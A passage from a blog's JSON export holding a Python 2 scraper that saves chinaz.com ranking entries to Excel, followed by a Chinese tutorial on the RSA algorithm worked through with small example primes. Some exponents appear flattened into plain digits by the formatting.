class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import urllib2</div><div class=\"line\">import re</div><div class=\"line\">import xlwt</div><div class=\"line\"></div><div class=\"line\">num = 2</div><div class=\"line\">workbook=xlwt.Workbook()\t\t<span class=\"comment\">#创建一个workbook对象</span></div><div class=\"line\">sheet1=workbook.add_sheet(<span class=\"string\">'sheet1'</span>,cell_overwrite_ok=True)\t<span class=\"comment\">#创建一个sheet对象</span></div><div class=\"line\">name_list=[]</div><div class=\"line\">url_list=[]</div><div class=\"line\"><span class=\"keyword\">while</span>(num&lt;=100):</div><div class=\"line\">\tuserMainUrl = <span class=\"string\">\"http://top.chinaz.com/diqu/index_ZheJiang_\"</span> + str(num) + <span class=\"string\">\".html\"</span>\t\t<span class=\"comment\">#对url进行拆分，进行循环</span></div><div class=\"line\">\treq = urllib2.Request(userMainUrl)</div><div class=\"line\">\tresp = urllib2.urlopen(req)</div><div class=\"line\">\trespHtml = resp.read()\t\t\t<span class=\"comment\">#把网页源代码提取出来赋值给respHtml</span></div><div class=\"line\">\tnum = num+1</div><div class=\"line\">\t<span class=\"comment\">#print \"respHtml=\", respHtml     </span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#class=\"pr10 fz14\"&gt;三国杀官方网站&lt;/a&gt;    需要匹配的名字</span></div><div class=\"line\">\t<span class=\"comment\">#&lt;/a&gt;&lt;span class=\"col-gray\"&gt;sanguosha.com&lt;/span&gt;   需要匹配的url</span></div><div class=\"line\">\tUrl = <span class=\"string\">'&lt;/a&gt;&lt;span\\s+?class=\"col-gray\"&gt;(?P&lt;gray&gt;.+?)&lt;/span&gt;'</span></div><div class=\"line\">\tName = <span class=\"string\">'\\s+?class=\"pr10 fz14\"&gt;(?P&lt;pr10&gt;.+?)&lt;/a&gt;'</span>\t<span class=\"comment\">#正则表达式，表示匹配的规则\"\\s+?、(?P&lt;&gt;.+?)\"</span></div><div class=\"line\">\tdef find(value):</div><div class=\"line\">\t\tcomp1 = re.compile(value)\t\t\t <span class=\"comment\">#将正则表达式编译，提高运行速度。</span></div><div class=\"line\">\t\tfoundNm = comp1.findall(respHtml)\t<span class=\"comment\">#表示在respHtml中进行匹配</span></div><div class=\"line\">\t\t<span class=\"built_in\">return</span> foundNm         <span class=\"comment\">#findall会返回一个列表，列表中的对象是字符串或乱码。</span></div><div class=\"line\">\t\t<span class=\"comment\"># for message in foundNm:\t\t\t\t#用for循环把列表的内容读取出来</span></div><div class=\"line\">\t\t\t<span class=\"comment\"># print message.decode('utf-8')    #.decode('utf-8')</span></div><div class=\"line\"></div><div class=\"line\">\tlsn = find(Name)</div><div class=\"line\">\tlsu = find(Url)</div><div class=\"line\"></div><div class=\"line\">\tname_list+=lsn\t\t\t<span class=\"comment\">#先把获取到的数据保存到列表当中，最后把整个列表一次性保存到excel中</span></div><div class=\"line\">\turl_list+=lsu</div><div class=\"line\"></div><div class=\"line\">count=len(name_list)</div><div class=\"line\">i=0</div><div class=\"line\"><span class=\"keyword\">while</span>(i &lt; count):</div><div class=\"line\">\tn=name_list[i]</div><div class=\"line\">\tu=url_list[i]</div><div class=\"line\">\ti+=1</div><div class=\"line\">\ttry:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> n.decode(<span class=\"string\">\"utf-8\"</span>), u</div><div class=\"line\">\texcept UnicodeEncodeError:\t\t\t<span class=\"comment\">#try...except语句抓取报错，避免出现一个错误导致后面的都不执行了。</span></div><div class=\"line\">\t\t<span class=\"built_in\">print</span> n, u</div><div class=\"line\">\tsheet1.write(i,0,n.decode(<span class=\"string\">\"utf-8\"</span>))</div><div class=\"line\">\tsheet1.write(i,1,u)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'loading......'</span></div><div class=\"line\"></div><div class=\"line\">workbook.save(<span class=\"string\">'xxx.xls'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'all the pages were done!!!'</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign: bman\"></a>sign: bman</h3>"},{"title":"RSA加密算法","date":"2016-10-11T08:54:44.000Z","_content":"RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。\nRSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和\n伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。\n\n1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。\n\n对极大整数做因数分解的难度决定了RSA算法的可靠性。即对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到2016年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。\n![RSA](/upload_image/rsa.jpg)\n\n## RSA算法\n### 密钥：\n加密和解密使用的规则（简称“密钥”）\n\n### 对称加密算法(Symmetric-key algorithm):\n\t加密和解密使用同一密钥（规则）的算法。\n\t（1）甲方选择某一种加密规则，对信息进行加密；\n\t（2）乙方使用同一种规则，对信息进行解密。\n\n### 非对称加密算法：\n\t加密和解密不使用同一规则，只要两种规则之间存在某种对应关系即可，可避免直接传递密钥。以\"公钥\"及\"私钥\"形成对应关系。公钥公开，私钥保密。\n\t（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，私钥则保密。\n\t（2）甲方获取乙方的公钥，然后用它对信息加密。\n\t（3）乙方得到加密后的信息，用私钥解密。\n\n## four Mathematic Theory\nThey can help you understand RSA much better. RSA is based on these four knowledge.\n\n### 1.coprime(互质关系)\n如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。\n　　1. 任意两个质数构成互质关系，比如13和61。\n　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。\n　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。\n　　4. 1和任意一个自然数是都是互质关系，比如1和99。\n　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。\n　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。\n### 2.欧拉函数\n![欧拉](/upload_image/oula.jpg)\n欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。\n[detail](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)\n### 3.模反元素\n![mofan](/upload_image/mofan.jpg)\n### 4.二进制与十进制转换算法\n\t十进制转二进制：\n\t\t用2辗转相除至结果为1 \n\t\t将余数和最后的1从下向上倒序写 就是结果\n\t\t例如302\n\t\t302/2 = 151 余0 \n\t\t151/2 = 75 余1 \n\t\t75/2 = 37 余1 \n\t\t37/2 = 18 余1 \n\t\t18/2 = 9 余0 \n\t\t9/2 = 4 余1 \n\t\t4/2 = 2 余0 \n\t\t2/2 = 1 余0 \n\t\t故二进制为100101110 \n\n\t二进制转十进制:\n\t\t从最后一位开始算，依次列为第0、1、2...位\n\t\t第n位的数（0或1）乘以2的n次方\n\t\t得到的结果相加就是答案\n\t\t例如:01101011.转十进制: \n\t\t第0位:1乘2的0次方=1 \n\t\t1乘2的1次方=2 \n\t\t0乘2的2次方＝0 \n\t\t1乘2的3次方＝8  \n\t\t0乘2的4次方＝0 \n\t\t1乘2的5次方＝32 \n\t\t1乘2的6次方＝64 \n\t\t0乘2的7次方＝0 \n\t\t然后：1＋2＋0 \n\t\t ＋8＋0＋32＋64＋0＝107． \n\t\t二进制01101011＝十进制107．\n## Generate key(生成密钥)\neg.假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？\n### step1：随机选择两个不相等的质数p和q。\np=61 & q=53(实际应用中，这两个质数越大，就越难破解。)\n\n### step2:计算p和q的乘积n\n\tn = 61×53 = 3233\nn的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位\n\n### step3:计算n的欧拉函数φ(n)\n公式：\n\tφ(n) = (p-1)(q-1)\n算出φ(3233)等于60×52，即3120。\n\n### step4:随机选择一个整数e，条件是1< e < φ(n)，且e与φ(n) 互质\n爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）\n\n### step5:\n\t所谓\"模反元素\"就是指有一个整数d，可以使得ed被φ(n)除的余数为1。\n\t　　ed ≡ 1 (mod φ(n))\n\t这个式子等价于\n\t　　ed - 1 = kφ(n)\n\t于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。\n\t　　ex + φ(n)y = 1\n\t已知 e=17, φ(n)=3120，\n\t　　17x + 3120y = 1\n\t这个方程可以用\"扩展欧几里得算法\"求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。\n\t至此所有计算完成。\n\n### step6:将n和e封装成公钥，n和d封装成私钥。\n在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。\n实际应用中，公钥和私钥的数据都采用ASN.1格式表达（实例）。\n\n### step7:RSA算法的可靠性\n回顾上面的密钥生成步骤，一共出现六个数字：\n``` bash　\n  　p\n　　q\n　　n\n　　φ(n)\n　　e\n　　d\n```\n这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。\n\n那么，有无可能在已知n和e的情况下，推导出d？\n\n``` bash\n　　（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。\n　　（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。\n　　（3）n=pq。只有将n因数分解，才能算出p和q。\n```\n结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。\n大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。\n\n举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。\n``` bash\n　　12301866845301177551304949\n　　58384962720772853569595334\n　　79219732245215172640050726\n　　36575187452021997864693899\n　　56474942774063845925192557\n　　32630345373154826850791702\n　　61221429134616704292143116\n　　02221240479274737794080665\n　　351419597459856902143413\n它等于这样两个质数的乘积\n　　33478071698956898786044169\n　　84821269081770479498371376\n　　85689124313889828837938780\n　　02287614711652531743087737\n　　814467999489\n　　　　×\n　　36746043666799590428244633\n　　79962795263227915816434308\n　　76426760322838157396665112\n　　79233373417143396810270092\n　　798736308917\n```\n事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。\n\n### step8:加密和解密\n\t有了公钥和密钥，就能进行加密和解密了。\n\t（1）加密要用公钥 (n,e)\n\t假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。\n\t所谓\"加密\"，就是算出下式的c：\n\t　　me ≡ c (mod n)\n\t爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：\n\t　　6517 ≡ 2790 (mod 3233)\n\t于是，c等于2790，鲍勃就把2790发给了爱丽丝。\n\t（2）解密要用私钥(n,d)\n\t爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：\n\t　　cd ≡ m (mod n)\n\t也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出\n\t　　27902753 ≡ 65 (mod 3233)\n\t因此，爱丽丝知道了鲍勃加密前的原文就是65。\n\t至此，\"加密--解密\"的整个过程全部完成。\n\t我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。\n\t你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种\"对称性加密算法\"（比如DES），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。\n\n### step9:私钥解密的证明\n\t最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：\n\t　　cd ≡ m (mod n)\n\t因为，根据加密规则\n\t　　ｍe ≡ c (mod n)\n\t于是，c可以写成下面的形式：\n\t　　c = me - kn\n\t将c代入要我们要证明的那个解密规则：\n\t　　(me - kn)d ≡ m (mod n)\n\t它等同于求证\n\t　　med ≡ m (mod n)\n\t由于\n\t　　ed ≡ 1 (mod φ(n))\n\t所以\n\t　　ed = hφ(n)+1\n\t将ed代入：\n\t　　mhφ(n)+1 ≡ m (mod n)\n\t接下来，分成两种情况证明上面这个式子。\n\t（1）m与n互质。\n\t根据欧拉定理，此时\n\t　　mφ(n) ≡ 1 (mod n)\n\t得到\n\t　　(mφ(n))h × m ≡ m (mod n)\n\t原式得到证明。\n\t（2）m与n不是互质关系。\n\t此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。\n\t以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：\n\t　　(kp)q-1 ≡ 1 (mod q)\n\t进一步得到\n\t　　[(kp)q-1]h(p-1) × kp ≡ kp (mod q)\n\t即\n\t　　(kp)ed ≡ kp (mod q)\n\t将它改写成下面的等式\n\t　　(kp)ed = tq + kp\n\t这时t必然能被p整除，即 t=t'p\n\t　　(kp)ed = t'pq + kp\n\t因为 m=kp，n=pq，所以\n\t　　med ≡ m (mod n)\n\t原式得到证明。\n\n### 摘录\n[more info1](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)\n[more info2](http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html)\n\n### sign:bman","source":"_posts/RSA加密算法.md","raw":"---\ntitle: RSA加密算法\ndate: 2016-10-11 16:54:44\ntags:\n---\nRSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。\nRSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和\n伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。\n\n1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。\n\n对极大整数做因数分解的难度决定了RSA算法的可靠性。即对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到2016年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。\n![RSA](/upload_image/rsa.jpg)\n\n## RSA算法\n### 密钥：\n加密和解密使用的规则（简称“密钥”）\n\n### 对称加密算法(Symmetric-key algorithm):\n\t加密和解密使用同一密钥（规则）的算法。\n\t（1）甲方选择某一种加密规则，对信息进行加密；\n\t（2）乙方使用同一种规则，对信息进行解密。\n\n### 非对称加密算法：\n\t加密和解密不使用同一规则，只要两种规则之间存在某种对应关系即可，可避免直接传递密钥。以\"公钥\"及\"私钥\"形成对应关系。公钥公开，私钥保密。\n\t（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，私钥则保密。\n\t（2）甲方获取乙方的公钥，然后用它对信息加密。\n\t（3）乙方得到加密后的信息，用私钥解密。\n\n## four Mathematic Theory\nThey can help you understand RSA much better. RSA is based on these four knowledge.\n\n### 1.coprime(互质关系)\n如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。\n　　1. 任意两个质数构成互质关系，比如13和61。\n　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。\n　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。\n　　4. 1和任意一个自然数是都是互质关系，比如1和99。\n　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。\n　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。\n### 2.欧拉函数\n![欧拉](/upload_image/oula.jpg)\n欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。\n[detail](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)\n### 3.模反元素\n![mofan](/upload_image/mofan.jpg)\n### 4.二进制与十进制转换算法\n\t十进制转二进制：\n\t\t用2辗转相除至结果为1 \n\t\t将余数和最后的1从下向上倒序写 就是结果\n\t\t例如302\n\t\t302/2 = 151 余0 \n\t\t151/2 = 75 余1 \n\t\t75/2 = 37 余1 \n\t\t37/2 = 18 余1 \n\t\t18/2 = 9 余0 \n\t\t9/2 = 4 余1 \n\t\t4/2 = 2 余0 \n\t\t2/2 = 1 余0 \n\t\t故二进制为100101110 \n\n\t二进制转十进制:\n\t\t从最后一位开始算，依次列为第0、1、2...位\n\t\t第n位的数（0或1）乘以2的n次方\n\t\t得到的结果相加就是答案\n\t\t例如:01101011.转十进制: \n\t\t第0位:1乘2的0次方=1 \n\t\t1乘2的1次方=2 \n\t\t0乘2的2次方＝0 \n\t\t1乘2的3次方＝8  \n\t\t0乘2的4次方＝0 \n\t\t1乘2的5次方＝32 \n\t\t1乘2的6次方＝64 \n\t\t0乘2的7次方＝0 \n\t\t然后：1＋2＋0 \n\t\t ＋8＋0＋32＋64＋0＝107． \n\t\t二进制01101011＝十进制107．\n## Generate key(生成密钥)\neg.假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？\n### step1：随机选择两个不相等的质数p和q。\np=61 & q=53(实际应用中，这两个质数越大，就越难破解。)\n\n### step2:计算p和q的乘积n\n\tn = 61×53 = 3233\nn的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位\n\n### step3:计算n的欧拉函数φ(n)\n公式：\n\tφ(n) = (p-1)(q-1)\n算出φ(3233)等于60×52，即3120。\n\n### step4:随机选择一个整数e，条件是1< e < φ(n)，且e与φ(n) 互质\n爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）\n\n### step5:\n\t所谓\"模反元素\"就是指有一个整数d，可以使得ed被φ(n)除的余数为1。\n\t　　ed ≡ 1 (mod φ(n))\n\t这个式子等价于\n\t　　ed - 1 = kφ(n)\n\t于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。\n\t　　ex + φ(n)y = 1\n\t已知 e=17, φ(n)=3120，\n\t　　17x + 3120y = 1\n\t这个方程可以用\"扩展欧几里得算法\"求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。\n\t至此所有计算完成。\n\n### step6:将n和e封装成公钥，n和d封装成私钥。\n在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。\n实际应用中，公钥和私钥的数据都采用ASN.1格式表达（实例）。\n\n### step7:RSA算法的可靠性\n回顾上面的密钥生成步骤，一共出现六个数字：\n``` bash　\n  　p\n　　q\n　　n\n　　φ(n)\n　　e\n　　d\n```\n这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。\n\n那么，有无可能在已知n和e的情况下，推导出d？\n\n``` bash\n　　（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。\n　　（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。\n　　（3）n=pq。只有将n因数分解，才能算出p和q。\n```\n结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。\n大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。\n\n举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。\n``` bash\n　　12301866845301177551304949\n　　58384962720772853569595334\n　　79219732245215172640050726\n　　36575187452021997864693899\n　　56474942774063845925192557\n　　32630345373154826850791702\n　　61221429134616704292143116\n　　02221240479274737794080665\n　　351419597459856902143413\n它等于这样两个质数的乘积\n　　33478071698956898786044169\n　　84821269081770479498371376\n　　85689124313889828837938780\n　　02287614711652531743087737\n　　814467999489\n　　　　×\n　　36746043666799590428244633\n　　79962795263227915816434308\n　　76426760322838157396665112\n　　79233373417143396810270092\n　　798736308917\n```\n事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。\n\n### step8:加密和解密\n\t有了公钥和密钥，就能进行加密和解密了。\n\t（1）加密要用公钥 (n,e)\n\t假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。\n\t所谓\"加密\"，就是算出下式的c：\n\t　　me ≡ c (mod n)\n\t爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：\n\t　　6517 ≡ 2790 (mod 3233)\n\t于是，c等于2790，鲍勃就把2790发给了爱丽丝。\n\t（2）解密要用私钥(n,d)\n\t爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：\n\t　　cd ≡ m (mod n)\n\t也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出\n\t　　27902753 ≡ 65 (mod 3233)\n\t因此，爱丽丝知道了鲍勃加密前的原文就是65。\n\t至此，\"加密--解密\"的整个过程全部完成。\n\t我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。\n\t你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种\"对称性加密算法\"（比如DES），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。\n\n### step9:私钥解密的证明\n\t最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：\n\t　　cd ≡ m (mod n)\n\t因为，根据加密规则\n\t　　ｍe ≡ c (mod n)\n\t于是，c可以写成下面的形式：\n\t　　c = me - kn\n\t将c代入要我们要证明的那个解密规则：\n\t　　(me - kn)d ≡ m (mod n)\n\t它等同于求证\n\t　　med ≡ m (mod n)\n\t由于\n\t　　ed ≡ 1 (mod φ(n))\n\t所以\n\t　　ed = hφ(n)+1\n\t将ed代入：\n\t　　mhφ(n)+1 ≡ m (mod n)\n\t接下来，分成两种情况证明上面这个式子。\n\t（1）m与n互质。\n\t根据欧拉定理，此时\n\t　　mφ(n) ≡ 1 (mod n)\n\t得到\n\t　　(mφ(n))h × m ≡ m (mod n)\n\t原式得到证明。\n\t（2）m与n不是互质关系。\n\t此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。\n\t以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：\n\t　　(kp)q-1 ≡ 1 (mod q)\n\t进一步得到\n\t　　[(kp)q-1]h(p-1) × kp ≡ kp (mod q)\n\t即\n\t　　(kp)ed ≡ kp (mod q)\n\t将它改写成下面的等式\n\t　　(kp)ed = tq + kp\n\t这时t必然能被p整除，即 t=t'p\n\t　　(kp)ed = t'pq + kp\n\t因为 m=kp，n=pq，所以\n\t　　med ≡ m (mod n)\n\t原式得到证明。\n\n### 摘录\n[more info1](http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html)\n[more info2](http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html)\n\n### sign:bman","slug":"RSA加密算法","published":1,"updated":"2017-05-31T07:58:06.616Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g1160002joo5e4g3kzqz","content":"<p>RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。<br>RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和<br>伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</p>\n<p>1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。</p>\n<p>对极大整数做因数分解的难度决定了RSA算法的可靠性。即对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到2016年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。<br><img src=\"/upload_image/rsa.jpg\" alt=\"RSA\"></p>\n<h2 id=\"RSA算法\"><a href=\"#RSA算法\" class=\"headerlink\" title=\"RSA算法\"></a>RSA算法</h2><h3 id=\"密钥：\"><a href=\"#密钥：\" class=\"headerlink\" title=\"密钥：\"></a>密钥：</h3><p>加密和解密使用的规则（简称“密钥”）</p>\n<h3 id=\"对称加密算法-Symmetric-key-algorithm\"><a href=\"#对称加密算法-Symmetric-key-algorithm\" class=\"headerlink\" title=\"对称加密算法(Symmetric-key algorithm):\"></a>对称加密算法(Symmetric-key algorithm):</h3><pre><code>加密和解密使用同一密钥（规则）的算法。\n（1）甲方选择某一种加密规则，对信息进行加密；\n（2）乙方使用同一种规则，对信息进行解密。\n</code></pre><h3 id=\"非对称加密算法：\"><a href=\"#非对称加密算法：\" class=\"headerlink\" title=\"非对称加密算法：\"></a>非对称加密算法：</h3><pre><code>加密和解密不使用同一规则，只要两种规则之间存在某种对应关系即可，可避免直接传递密钥。以&quot;公钥&quot;及&quot;私钥&quot;形成对应关系。公钥公开，私钥保密。\n（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，私钥则保密。\n（2）甲方获取乙方的公钥，然后用它对信息加密。\n（3）乙方得到加密后的信息，用私钥解密。\n</code></pre><h2 id=\"four-Mathematic-Theory\"><a href=\"#four-Mathematic-Theory\" class=\"headerlink\" title=\"four Mathematic Theory\"></a>four Mathematic Theory</h2><p>They can help you understand RSA much better. RSA is based on these four knowledge.</p>\n<h3 id=\"1-coprime-互质关系\"><a href=\"#1-coprime-互质关系\" class=\"headerlink\" title=\"1.coprime(互质关系)\"></a>1.coprime(互质关系)</h3><p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。<br>　　1. 任意两个质数构成互质关系，比如13和61。<br>　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。<br>　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。<br>　　4. 1和任意一个自然数是都是互质关系，比如1和99。<br>　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。<br>　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p>\n<h3 id=\"2-欧拉函数\"><a href=\"#2-欧拉函数\" class=\"headerlink\" title=\"2.欧拉函数\"></a>2.欧拉函数</h3><p><img src=\"/upload_image/oula.jpg\" alt=\"欧拉\"><br>欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。<br><a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\" target=\"_blank\" rel=\"external\">detail</a></p>\n<h3 id=\"3-模反元素\"><a href=\"#3-模反元素\" class=\"headerlink\" title=\"3.模反元素\"></a>3.模反元素</h3><p><img src=\"/upload_image/mofan.jpg\" alt=\"mofan\"></p>\n<h3 id=\"4-二进制与十进制转换算法\"><a href=\"#4-二进制与十进制转换算法\" class=\"headerlink\" title=\"4.二进制与十进制转换算法\"></a>4.二进制与十进制转换算法</h3><pre><code>十进制转二进制：\n    用2辗转相除至结果为1 \n    将余数和最后的1从下向上倒序写 就是结果\n    例如302\n    302/2 = 151 余0 \n    151/2 = 75 余1 \n    75/2 = 37 余1 \n    37/2 = 18 余1 \n    18/2 = 9 余0 \n    9/2 = 4 余1 \n    4/2 = 2 余0 \n    2/2 = 1 余0 \n    故二进制为100101110 \n\n二进制转十进制:\n    从最后一位开始算，依次列为第0、1、2...位\n    第n位的数（0或1）乘以2的n次方\n    得到的结果相加就是答案\n    例如:01101011.转十进制: \n    第0位:1乘2的0次方=1 \n    1乘2的1次方=2 \n    0乘2的2次方＝0 \n    1乘2的3次方＝8  \n    0乘2的4次方＝0 \n    1乘2的5次方＝32 \n    1乘2的6次方＝64 \n    0乘2的7次方＝0 \n    然后：1＋2＋0 \n     ＋8＋0＋32＋64＋0＝107． \n    二进制01101011＝十进制107．\n</code></pre><h2 id=\"Generate-key-生成密钥\"><a 